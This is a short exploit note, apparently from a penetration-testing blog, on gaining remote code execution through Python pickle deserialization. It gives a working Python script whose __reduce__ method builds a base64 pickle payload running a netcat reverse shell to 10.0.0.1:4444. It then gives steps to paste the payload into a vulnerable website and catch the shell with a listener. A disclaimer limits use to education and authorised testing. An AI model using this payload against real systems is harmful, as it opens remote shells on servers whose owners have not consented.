---
title: PYTHON PICKLE RCE
date: 2023-05-05 01:35:40 +/-TTTT
categories: [learning, web]
tags: [learning]     # TAG names should always be lowercase
---

The python “pickle” module, that serializes and deserializes a Python object, is vulnerable to remote code execution. If the website uses this module, we may be able to execute arbitrary code.

# Exploitation
Below is the Python script (”mypickle.py”) to generate the payload to reverse shell.

```py
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
Now run this script to generate the Base64 payload.

```py
python3 mypickle.py
```
Copy the ourput base64 string and paste it to where the payload affects in website.
Before reloading the web page, start a listener in local machine.
```
nc -lvnp 4444
```
Then reload the page. We should get a shell in local terminal.

# References
* https://davidhamann.de/2020/04/05/exploiting-python-pickle/

# Disclaimer
```
Exploit Notes are only for educational purpose or penetration testing, not attacking servers that you're not authorized. This site will not take any responsibility even if you attack the server illegally or cause damage unintentionally. Please use the contents in this site at your own risk.
The contents of this site are not original, but based on the information on the internet, the author actually tried and functioned. Although the author strives to post the latest information on the content of this site as much as possible, there is no guarantee that it will always be new.
```